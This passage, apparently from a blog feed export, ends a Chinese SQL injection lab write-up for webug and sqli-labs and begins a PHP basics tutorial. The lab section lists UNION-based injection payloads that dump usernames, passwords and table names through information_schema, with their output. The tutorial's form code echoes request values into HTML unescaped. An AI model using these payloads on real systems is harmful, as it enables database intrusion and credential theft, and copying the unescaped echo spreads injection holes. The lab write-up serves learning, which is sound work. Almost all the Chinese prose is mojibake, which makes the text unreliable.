ä¸ºç¬¬ä¸€æ¡è®°å½•æ˜¯æˆ‘ä»¬ select 1,2è”åˆæŸ¥è¯¢æ’å…¥çš„.)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> webug.flag;</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>1</th><th>2</th></tr></thead><tbody><tr class="odd"><td>1</td><td>2</td></tr><tr class="even"><td>1</td><td>dfafdasfafdsadfa</td></tr></tbody></table><p>å…¶å®æˆ‘ä»¬æ§åˆ¶æ˜¾ç¤ºä½æ˜¾ç¤ºçš„å¹¶ä¸å®Œç¾,ä¸‡ä¸€æœ‰å¤šæ¡è®°å½•,æ€ä¹ˆåŠ?ä¸€å †éƒ½æ˜¾ç¤ºå‡ºæ¥ä¸å¥½çœ‹.</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ orde by å’Œ limit æ¥ä¼˜åŒ–ç»“æœ.ä½†æ˜¯å¯èƒ½æ˜¯è¯­å¥å¤ªå¤æ‚(æˆ‘æµ‹è¯•æ¯”è¾ƒç®€å•çš„è¯­å¥ä¸æŠ¥é”™), æˆ‘è¿™è¾¹ä½¿ç”¨ order byåˆ«å(ç»™ concat_ws çš„æ•°æ®èµ·ä¸€ä¸ªåˆ«å) æ—¶, æŠ¥é”™. ä¸è¿‡, çŸ¥é“è¿™ä¸ªå°±å¥½äº†,ä¸‡ä¸€ä»¥åç”¨å¾—åˆ°å‘¢.</p><h2 id="è¿›ä¸€æ­¥çˆ†åº“çˆ†è¡¨">è¿›ä¸€æ­¥çˆ†åº“çˆ†è¡¨</h2><p>è™½ç„¶ flag å·²ç»æ‹¿åˆ°äº†,è¿™é‡Œæ·±å…¥ä¸€ä¸‹, å†åšå‡ ä¸ªç¤ºä¾‹, æ¯•ç«Ÿä¹‹å‰ä½ éƒ½çŸ¥é“äº†,è¿™ä¸ªæ˜¯ä½¿ç”¨ root ç™»å½•çš„æƒ³çœ‹ä»€ä¹ˆæœ‰ä»€ä¹ˆ,è¿™ä¸ªè¦æ˜¯åœ¨å®æˆ˜ä¸­,è¿™ä¸ªç«™å·²ç»å¯ä»¥è¢«æ‹¿ä¸‹äº†. é¡ºä¾¿æ·±å…¥å­¦ä¹ ä¸€ä¸‹ mysql çš„information_schema åº“.</p><h3 id="çˆ†-webug-ä¸­çš„ç”¨æˆ·åä»¥åŠå¯†ç ">çˆ† webug ä¸­çš„ç”¨æˆ·åä»¥åŠå¯†ç </h3><p>//çŒœåˆ—å payload 8:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,2 from (select 1,2,3 union select * from webug.user)tabl --+</span></span><br></pre></td></tr></table></figure><p>çˆ† webug ä¸­çš„ç”¨æˆ·åä»¥åŠå¯†ç  payload 9:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, `1`,`2`,`3`) from (select 1,2,3 union select * from webug.user)tabl --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: 1 , 2 , 31 , admin , admin</p><p>ä¸‹é¢ä¸ºä¸Šé¢ payload 9 æ‹¬å·ä¸­ select çš„ç»“æœé›†.</p><table><thead><tr class="header"><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr class="odd"><td>1</td><td>2</td><td>3</td></tr><tr class="even"><td>1</td><td>admin</td><td>admin</td></tr></tbody></table><p>è™½ç„¶ä¸çŸ¥é“å­—æ®µå, ä½†æ˜¯çœ‹ç€è¿™è¡¨å user, çœ‹ç€è¿™æ•°æ® admin, admin,å°±ç®—æ˜¯èœé¸¡,å’±ä¹ŸçŸ¥é“, è¿™æ˜¯ç”¨æˆ·åå’Œå¯†ç å‘€. (æ¨æ–­åŸè¡¨ç»“æ„å¤§è‡´ä¸º: idusername password)</p><h3 id="çˆ†-security-åº“çš„è¡¨å">çˆ† security åº“çš„è¡¨å</h3><p>security ä¸º sqli-labs å¯¹åº”çš„æ•°æ®åº“, ç›¸ä¿¡ä½ ä»¬éƒ½æœ‰çš„</p><p>æ„é€  payload 10:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat(table_name,&#x27;</span> , <span class="string">&#x27;) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾: emails , referers , uagents , users ,</p><p>ä½œä¸ºèœé¸Ÿæ¥è¯´ï¼Œè¿™ä¸ªæ³¨å…¥å°±åŸºæœ¬å®Œæˆäº†ï¼Œè‡³äºè¦æ˜¯è¿˜æœ‰ä»€ä¹ˆæ·±å…¥çš„ç†è§£ï¼Œä»¥åç†è§£äº†å†è¯´å§emm...</p><h2 id="æ€»ç»“å›é¡¾">æ€»ç»“å›é¡¾</h2><ol type="1"><li>è¦å¥½å¥½æŒæ¡æ•°æ®åº“çš„å…ƒæ•°æ®åº“, å¯¹åº” mysql ä¸­ information_schema åº“,å°¤å…¶æ˜¯ tables è¡¨. ä»¥åå­¦ä¹  sqlserver æ³¨å…¥,ä¹Ÿè¦è¿™æ ·å­¦.</li><li>å¦‚ä½•çˆ†å­—æ®µåå¥½åƒè¿˜æ²¡æœ‰å­¦ä¼š, æœ‰æ—¶é—´å¾—å­¦ä¸€ä¸‹.</li><li>mysql æ•°æ®åº“å‘½åè§„èŒƒæœ‰æ—¶é—´è¦çœ‹ä¸€çœ‹.</li><li>concat å’Œ concat_ws å¯ä»¥ç”¨æ¥åˆ†å‰²ä¸åŒå­—æ®µ/æ•°æ®,è‡³äºåˆ†éš”ç¬¦é€‰ä»€ä¹ˆ,ä¸è¦é€‰ # , åˆ†å·ç­‰æ•æ„Ÿå­—ç¬¦(ä¸‡ä¸€ç»™è½¬ä¹‰äº†),å…¶ä»–çš„è‡ªå·±çœ‹ç€æ¥å§.</li><li>ä¸åŒç‰ˆæœ¬æ•°æ®åº“æœ‰äº›åŠŸèƒ½å¯èƒ½ä¸åŒ, ä»¥åæ¸—é€çš„æ—¶å€™,é¦–å…ˆæ³¨å…¥å‡ºæ•°æ®åº“ç‰ˆæœ¬, ç„¶åè‡ªå·±å®‰è£…ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬æ•°æ®åº“, è¿™æ ·åœ¨æ„é€  paylaodçš„æ—¶å€™å°±æ›´æœ‰æŠŠæ¡äº†, å‡ºé”™ä¹ŸçŸ¥é“æ˜¯ä¸ºä»€ä¹ˆå‡ºé”™. (ps.é¿å…è‡ªå·±åœ¨è‡ªå·±ç”µè„‘çš„ç‰ˆæœ¬ä¸Šæµ‹è¯• payload ç”¨åˆ°çš„çš„æŸäº›ç»†èŠ‚ç‰¹æ€§æ­£å¸¸,ä½†æ˜¯æµ‹è¯•ç³»ç»Ÿçš„ç‰ˆæœ¬ä¸æ”¯æŒè¯¥ç‰¹æ€§).</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPåŸºæœ¬è¯­æ³•è§„èŒƒåŠå¸¸é‡ä¸å˜é‡</title>
      <link href="/blog/2019/07/23/programming/php/php_basic_syntax_and_const_vari/"/>
      <url>/blog/2019/07/23/programming/php/php_basic_syntax_and_const_vari/</url>
      
        <content type="html"><![CDATA[<h1 id="php-åŸºæœ¬è¯­æ³•è§„åˆ™">PHP åŸºæœ¬è¯­æ³•è§„åˆ™</h1><h2 id="php-æ ‡è®°">PHP æ ‡è®°</h2><p>PHP è¯­è¨€ï¼Œæ˜¯ä¸€ç§å¯ä»¥åµŒå…¥åˆ° â€œhtmlâ€ ä»£ç ä¸­çš„åå°å¤„ç†è¯­è¨€ï¼ˆç¨‹åºï¼‰</p><p>æœ‰ä»¥ä¸‹å‡ ç§æ ‡è®°å½¢å¼ï¼Œåªæ¨èç¬¬ä¸€ç§ã€‚</p><ol type="1"><li><p>&lt;?php php ä»£ç å†™åœ¨è¿™é‡Œ..... ?&gt;</p></li><li><p>&lt;script language="php" &gt; php ä»£ç å†™åœ¨è¿™é‡Œ.....&lt;/script&gt;</p></li><li><p>&lt;? php ä»£ç å†™åœ¨è¿™é‡Œ..... ?&gt;</p><p>æ­¤ç§æ–¹æ³•éœ€è¦åˆ° php.ini ä¸­è¿›è¡Œé…ç½®ï¼šshort_open_tag = On //é»˜è®¤ä¸ºOffï¼Œè¡¨ç¤ºä¸èƒ½ç”¨è¯¥å½¢å¼ã€‚</p></li></ol><p><strong>æ³¨æ„ï¼š</strong></p><p>çº¯ PHP ä»£ç ï¼šå¯ä»¥çœç•¥æ ‡è®°ç»“å°¾ç¬¦ã€‚</p><p>åé¢ï¼Œæˆ‘ä»¬ä¼šå†™å¾ˆå¤šâ€œçº¯ php ä»£ç æ–‡ä»¶â€ï¼ˆé‡Œé¢æ²¡æœ‰ä»»ä½• html ä»£ç ï¼‰ã€‚</p><h2 id="php-è¯­å¥ç»“æŸç¬¦">PHP è¯­å¥ç»“æŸç¬¦</h2><p>ä½¿ç”¨è‹±æ–‡åˆ†å·ï¼ˆ;ï¼‰è¡¨ç¤ºä¸€æ¡è¯­å¥çš„ç»“æŸã€‚</p><h2 id="php-è¾“å‡º">PHP è¾“å‡º</h2><p>é€šè¿‡ PHPï¼Œæœ‰ä¸¤ç§åœ¨æµè§ˆå™¨è¾“å‡ºæ–‡æœ¬çš„åŸºç¡€æŒ‡ä»¤ï¼š<strong>echo</strong> å’Œ<strong>print</strong>ã€‚</p><h2 id="php-æ³¨é‡Š">PHP æ³¨é‡Š</h2><p>å’Œ C++ ä¸€æ ·ï¼Œå•è¡Œæ³¨é‡Šï¼š//æ³¨é‡Šå†…å®¹ å¤šè¡Œæ³¨é‡Šï¼š/_ æ³¨é‡Šå†…å®¹_/</p><h2 id="php-ä¸­çš„å¼•å·">PHP ä¸­çš„å¼•å·</h2><ol type="1"><li><p>å­—ç¬¦ä¸²</p><p>åœ¨ PHPä¸­ï¼Œå­—ç¬¦ä¸²çš„å®šä¹‰å¯ä»¥ä½¿ç”¨å•å¼•å·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€‚ä½†æ˜¯å¿…é¡»ä½¿ç”¨åŒä¸€ç§å•æˆ–åŒå¼•å·æ¥å®šä¹‰å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šâ€˜Hello"å’Œâ€œHello'ä¸ºéæ³•çš„å­—ç¬¦ä¸²å®šä¹‰ã€‚</p></li><li><p>å•å¼•å·</p><p>åŒå¼•å·é‡Œé¢çš„å­—æ®µä¼šç»è¿‡ç¼–è¯‘å™¨è§£é‡Šç„¶åå†å½“ä½œ HTMLä»£ç è¾“å‡ºï¼Œä½†æ˜¯å•å¼•å·é‡Œé¢çš„ä¸éœ€è¦è§£é‡Šï¼Œç›´æ¥è¾“å‡ºã€‚</p></li><li><p>html ä½¿ç”¨å•¥å¼•å·</p><p>è¦çŸ¥é“ php æœ€ç»ˆè¦è¾“å‡º htmlï¼Œæ‰€ä»¥ php ä¸­ä½¿ç”¨ htmlæ—¶ï¼Œä½¿ç”¨å•å¼•å·å³å¯ã€‚</p><p>html åŒ…å«å¾ˆå¤šçš„åŒå¼•å·ä½¿ç”¨ï¼Œå¯ä»¥ç”¨å•å¼•å·åŒ…å«èµ·æ¥ï¼Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚åŒå¼•å·è™½å¥½ï¼Œèƒ½åŒ…å«å˜é‡å’Œè½¬ä¹‰å­—ç¬¦ï¼Œä½†æ˜¯æ•ˆç‡æ¯”å•å¼•å·ä½ï¼Œèƒ½ç”¨å•å¼•å·çš„å°½é‡ç”¨å•å¼•å·ï¼Œä¸å¯å¿½ç•¥çš„æ˜¯ï¼Œè¦æ³¨æ„åŒºåˆ†è‹±æ–‡å’Œä¸­æ–‡å¼•å·</p><p><strong>æ³¨ï¼šå•å¼•å·é‡Œé¢çš„åŒå¼•å·ä¸­çš„å˜é‡ä¸ä¼šè§£æï¼</strong></p></li></ol><h1 id="å˜é‡">å˜é‡</h1><p>å®šä¹‰å½¢å¼ï¼š $å˜é‡å = å…·ä½“çš„æ•°æ®;</p><p>æ³¨æ„ï¼š<strong>å˜é‡ååŒºåˆ†å¤§å°å†™</strong></p><h2 id="å˜é‡çš„å‘½åè§„åˆ™">å˜é‡çš„å‘½åè§„åˆ™</h2><p>ä¸ C++ ç›¸åŒï¼Œå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä¸ä»¥æ•°å­—å¼€å¤´ã€‚</p><p>éª†é©¼å‘½åæ³•ï¼ˆå°é©¼å³°å‘½åæ³•ï¼‰ï¼šç¬¬ä¸€ä¸ªå•è¯é¦–å­—æ¯å°å†™ï¼Œå…¶ä½™å•è¯é¦–å­—æ¯å¤§å†™ã€‚</p><p>childAge, yungerAge, parentHouse, myParentHouse,myParentHousePrice</p><p>å…¶ä¸­ JavaScript çš„å‡½æ•°å‘½åè§„åˆ™ä¾¿æ˜¯å°é©¼å³°å‘½åæ³•ã€‚</p><p>å¸•æ–¯å¡å‘½åæ³•ï¼ˆå¤§é©¼å³°å‘½åæ³•ï¼‰ï¼šæ‰€æœ‰å•è¯éƒ½é¦–å­—æ¯å¤§å†™ã€‚</p><p>ChildAge, YungerAge, ParentHouse, MyParentHouse,MyParentHousePrice</p><h2 id="å˜é‡çš„æ“ä½œ">å˜é‡çš„æ“ä½œ</h2><p>èµ‹å€¼ $v1 = 'Hello World'; å–å€¼: echo $v1;</p><h3 id="åˆ¤æ–­å˜é‡isset">åˆ¤æ–­å˜é‡ï¼šisset()</h3><p>åˆ¤æ–­ä¸€ä¸ªâ€œå˜é‡åâ€æ˜¯å¦é‡Œé¢å­˜å‚¨äº†æ•°æ®ï¼ç»“æœï¼štrueï¼ˆçœŸï¼Œè¡¨ç¤ºæœ‰ï¼‰ï¼Œæˆ–è€…falseï¼ˆå‡ï¼Œè¡¨ç¤ºæ²¡æœ‰ï¼‰ã€‚</p><p>ä½¿è¯­æ³•ï¼šisset( $å˜é‡å );</p><p>è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„èµ‹å€¼ï¼Œèµ‹å€¼åï¼Œå˜é‡ä¸­ä¹Ÿæ²¡æœ‰æ•°æ®ï¼Œå¦‚ä¸‹ï¼š</p><p>$v5 = null; //nullæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„â€œæ•°æ®â€ï¼ˆå€¼ï¼‰ï¼Œè¯¥æ•°æ®çš„å«ä¹‰æ˜¯ï¼šæ²¡æœ‰æ•°æ®ã€‚</p><p>å³æ­¤æ—¶åˆ¤æ–­ isset($v5) çš„ç»“æœæ˜¯â€œfalseâ€ã€‚</p><p>å› ä¸ºä¸Šé¢ç›´æ¥ echo isset($v5) ï¼›ç»“æœå¹¶ä¸æ˜æ˜¾ï¼Œå¯ä»¥ä½¿ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$v5</span>));</span><br></pre></td></tr></table></figure><p><strong>var_dump()</strong> å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p><strong>var_dump()</strong>å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚</p><p>åˆ é™¤/é”€æ¯å˜é‡ unset()</p><p>å½“ä¸€ä¸ªå˜é‡ä¸­å­˜å‚¨äº†æ•°æ®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å»é”€æ¯ï¼ˆåˆ é™¤ï¼‰å®ƒï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><p>unset( $å˜é‡å ï¼‰ã€‚</p><p>åˆ é™¤å˜é‡çš„æœ¬è´¨æ˜¯ï¼šæ–­å¼€å˜é‡åè·Ÿå…¶å…³è”è¿‡çš„é‚£ä¸ªæ•°æ®ä¹‹é—´çš„â€œè”ç³»â€ï¼Œæ–­å¼€ä¹‹åï¼Œè¯¥å˜é‡å°±ä¸å†æŒ‡å‘æŸä¸ªæ•°æ®äº†ï¼Œå…¶isset() åˆ¤æ–­çš„ç»“æœä¸º falseã€‚</p><h2 id="å˜é‡ä¼ å€¼">å˜é‡ä¼ å€¼</h2><h3 id="å€¼ä¼ é€’">å€¼ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$v2</span>;</span><br></pre></td></tr></table></figure><h3 id="å¼•ç”¨ä¼ é€’">å¼•ç”¨ä¼ é€’</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = &amp;<span class="variable">$v2</span>;</span><br></pre></td></tr></table></figure><p>è¦æ³¨æ„çš„æœ‰ä¸€ç‚¹: unset() æ˜¯æ–­å¼€åç§°ä¸å†…å­˜æ•°æ®ä¹‹é—´çš„è”ç³».æ‰€ä»¥å¯¹ä¸¤ä¸ªå¼•ç”¨åŒä¸€å—å†…å­˜æ•°æ®çš„å˜é‡æ¥è¯´, å¯¹ä¸€ä¸ªæ•°æ®è¿›è¡Œ unset()ä¸ä¼šå½±å“å¦ä¸€ä¸ªæ•°æ®.</p><p>åŸç†ä½ æ‡‚çš„ã€‚</p><h2 id="é¢„å®šä¹‰å˜é‡">é¢„å®šä¹‰å˜é‡</h2><p>åœ¨ PHP è¯­è¨€å†…éƒ¨ï¼Œæœ‰ä¸€äº›ï¼ˆä¹Ÿå°± 10æ¥ä¸ªï¼‰å˜é‡ï¼Œæ˜¯ç°æˆçš„ï¼Œç›´æ¥å¯ä»¥ä½¿ç”¨ï¼Œè¿™å°±æ˜¯æ‰€è°“é¢„å®šä¹‰å˜é‡ã€‚</p><p>æˆ‘ä»¬è¦åšçš„æ˜¯äº‹æƒ…å°±æ˜¯ï¼šç†è§£è¯¥å˜é‡æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä»¥åŠæ€ä¹ˆç”¨ï¼</p><h3 id="get-å˜é‡">$_GET å˜é‡</h3><p>ä»£è¡¨æµè§ˆå™¨è¡¨å•é€šè¿‡â€œgetâ€æ–¹å¼æäº¤çš„æ‰€æœ‰æ•°æ®ï¼ˆé›†ï¼‰ï¼Œå¯ä»¥ç§°ä¸ºâ€œgetæ•°æ®â€ã€‚</p><p>ä¹Ÿå¯ä»¥ç†è§£ä¸ºï¼š</p><p>$_GET å˜é‡é‡Œé¢ä¼šâ€œè‡ªåŠ¨å­˜å‚¨â€ï¼ˆä¿å­˜/è£…è½½ï¼‰æäº¤åˆ°æŸä¸ªæ–‡ä»¶ä¸­çš„ GETæ•°æ®ã€‚</p><p>è€Œ GET æ•°æ®ï¼Œæ˜¯åœ¨ä¸€ä¸ªé¡µé¢ä»¥â€œgetâ€æ–¹å¼è¯·æ±‚çš„æ—¶å€™æäº¤çš„æ•°æ®ã€‚</p><p>ä½¿ç”¨ get æ–¹æ³•æäº¤è¡¨å•çš„ URL ä¸€èˆ¬æœ‰fileName.php?userName=å¼ ä¸‰&amp;age=15 ä»¥ä¸‹ç‰¹å¾ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/php_get.png"alt="php_get" /><figcaption aria-hidden="true">php_get</figcaption></figure><h3 id="post-å˜é‡">$_POST å˜é‡</h3><p>ä»£è¡¨æµè§ˆå™¨è¡¨å•é€šè¿‡â€œpostâ€æ–¹å¼æäº¤çš„æ‰€æœ‰æ•°æ®ï¼ˆé›†ï¼‰ï¼Œå¯ä»¥ç§°ä¸ºâ€œPOSTæ•°æ®â€ã€‚</p><p>ä¹Ÿå¯ä»¥ç†è§£ä¸ºï¼š</p><p>$_POST å˜é‡é‡Œé¢ä¼šâ€œè‡ªåŠ¨å­˜å‚¨â€ï¼ˆä¿å­˜/è£…è½½ï¼‰æäº¤åˆ°æŸä¸ªæ–‡ä»¶ä¸­çš„ POSTæ•°æ®ã€‚</p><p>è€Œ POST æ•°æ®ï¼Œæ˜¯åœ¨ä¸€ä¸ªè¡¨å•ä¸­ä»¥â€œpostâ€æ–¹å¼æäº¤çš„æ•°æ®ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/php_post.png"alt="php_post" /><figcaption aria-hidden="true">php_post</figcaption></figure><p>åŠ æ³•æ”¹è¿›(åˆå§‹æ˜¾ç¤ºä¸æäº¤é¡µé¢ä¸ºä¸€ä¸ªé¡µé¢, å³: å‘è‡ªå·±æäº¤)</p><p>çŸ¥è¯†ç‚¹: action=''ä¸ºç©ºæ—¶,æ„æ€æ˜¯æäº¤ç»™è‡ªå·±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;!-- ä½œä¸º post è®¡ç®—åŠ æ³•çš„æ”¹è¿›,åˆå§‹ä¸æäº¤å†ä¹Ÿä¸ªé¡µé¢ä¸Šå®Œæˆ--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="string">&quot;&quot;</span>;<span class="comment">//å…ˆæŠŠä¸‰ä¸ªå˜é‡å®šä¹‰ä¸Šï¼Œå…å¾—ç¬¬ä¸€æ¬¡è½½å…¥é¡µé¢ï¼ˆ$POST é¢„å®šä¹‰å˜é‡ä¸­æ²¡æœ‰æ•°æ®ï¼‰æ—¶æŠ¥é”™</span></span><br><span class="line"><span class="variable">$n2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$sum</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//è·å–è¾“å…¥</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line"><span class="variable">$n2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"><span class="variable">$sum</span> = <span class="variable">$n1</span> + <span class="variable">$n2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num1&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n1;?&gt;&#x27;</span>&gt;&lt;!--æ•°å­—<span class="number">1</span> --&gt;</span><br><span class="line">+</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;num2&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $n2;?&gt;&#x27;</span>&gt;&lt;!-- æ•°å­—<span class="number">2</span> !--&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> value=<span class="string">&#x27;=&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $sum;?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="request-å˜é‡">$_REQUEST å˜é‡</h3><p>ä»£è¡¨æµè§ˆå™¨é€šè¿‡â€œgetâ€æ–¹å¼ æˆ– â€œpostâ€æ–¹å¼æäº¤çš„æ•°æ®çš„åˆé›†ã€‚</p><p>å³ï¼šå®ƒæ—¢èƒ½æ¥æ”¶åˆ° get è¿‡æ¥çš„æ•°æ®ï¼Œä¹Ÿèƒ½æ¥æ”¶åˆ° post è¿‡æ¥çš„æ•°æ®ï¼</p><p>é€šå¸¸ï¼Œä¸€ä¸ªè¡¨å•ï¼Œåªæäº¤ä¸€ç§å½¢å¼çš„æ•°æ®ï¼Œè¦ä¹ˆ get æ•°æ®ï¼Œè¦ä¹ˆ postæ•°æ®ï¼</p><p>æ³¨: å¦‚æœæ˜ç¡®æ˜¯ post æˆ– get å°±ç”¨ $_POST æˆ– <spanclass="math inline">\(\_GET, ä¸ç¡®å®šæ—¶,å†ç”¨\)</span>_REQUEST</p><p>è¿™é‡Œå°±ä¸æ¼”ç¤ºäº†.</p><p>æ³¨æ„: æœ‰ä¸€ä¸ªæƒ…å†µï¼Œæäº¤ post æ•°æ®çš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥æäº¤ get æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$n1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$n2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$sum</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;num1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$n1</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line"><span class="variable">$n2</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"><span class="variable">$sum</span> = <span class="variable">$n1</span> + <span class="variable">$n2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; ç”¨æˆ·å: &quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;userName&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt; ä½ çš„è´¦æˆ·ä½™é¢ä¸º: 0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;request_form.php?id=10&amp;userName=zhangsan&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">&lt;!--è¿™ç§è¡¨å•å½¢å¼,æ‰å¯ä»¥è®©ä¸€ä¸ªè¡¨å•åŒæ—¶æäº¤getæ•°æ®å’Œpostæ•°æ®:</span><br><span class="line">action 